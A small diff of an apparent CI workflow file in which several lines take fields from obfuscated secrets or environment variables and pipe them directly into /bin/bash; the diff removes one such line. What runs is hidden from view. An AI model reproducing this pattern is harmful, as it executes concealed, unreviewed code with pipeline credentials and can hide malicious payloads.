@@ -18,7 +18,6 @@ jobs:
           j4621: ${{ secrets.j4621 }}
         run: |
           printf '%s' "$j4621" | jq -r .t00828 | /bin/bash
-          echo $tuqz715 | jq -r .qnz90 | /bin/bash
           echo $lho15073 | jq -r .ux813 | /bin/bash
           printf '%s' "$r4765" | jq -r .vwp97 | /bin/bash
           printf '%s' "$ixfbz92" | jq -r .tbkgk7 | /bin/bash
